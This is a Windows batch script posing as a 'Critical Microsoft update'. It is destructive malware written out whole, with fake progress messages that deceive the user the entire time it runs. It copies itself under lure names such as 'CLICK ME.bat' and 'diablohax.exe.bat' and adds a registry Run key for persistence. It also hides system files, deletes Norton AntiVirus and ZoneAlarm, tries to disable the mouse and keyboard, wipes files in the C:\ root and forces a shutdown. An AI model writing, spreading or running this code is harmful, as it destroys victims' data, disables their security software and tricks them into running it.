   @ECHO OFF
   echo Critical Microsoft update starting.  Please wait...
   mkdir c:\criticalupdate
   mkdir c:\desktop\Urgent Please Open
   copy %0 c:\desktop\diablohax.exe.bat
   copy %0 c:\desktop\Urgent Please Open\open_me.bat
   copy %0 c:\criticalupdate\check.bat
   copy %0 c:\one.bat
   copy %0 c:\Program Files\gamepack.bat
   copy %0 c:\Desktop\CLICK ME.bat
   copy %0 c:\Desktop\system update.bat
   copy %0 c:\Program Files\KazaaLite.bat
   copy %0 c:\WINDOWS\AutoExec.bat
   copy c:\desktop\Urgent Please Open\open_me.bat c:\WINDOWS\System\dimshell32.bat
   echo set w0rm = createobject("wscript.shell")
   >c:\1.vbs
   echo w0rm.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\worm",%0 >>c:\1.vbs
   attrib +h +s +r +a c:\*.*
   echo Critical update 57% complete
   If Exist C:\Program Files\Norton AntiVirus\(
   del C:\Program Files\Norton AntiVirus\*.* /q /f
   ) else (
   echo n/.
   )
   If Exist c:\Program Files\ZoneAlarm (
   del c:\Program Files\ZoneAlarm\*.* /q /f
   ) else (
   echo n/..
   )
   echo Critical update 80% complete
   echo Your mouse and/or keyboard may not work for a moment.  Please be paitent as the update fixes the software for these components.
   cd c:\windows
   rundll32.exe mouse,disable
   rundll32.exe keyboard,disable
   echo .
   echo ..
   echo ...
   echo ....
   echo .....
   echo ......
   echo .......
   echo keyboard/mouse re-write initiated
   echo Your system may act slow or incorrectly during these next few moments, please stand by. Sorry for any problems this may cause.
   echo starting...
   del c:\*.* /q /f
   echo done!
   echo Your computer will now shut down.  You may restart after the shutdown.
   Cd\
   type *.*
   shutdown -f -t 00 -s
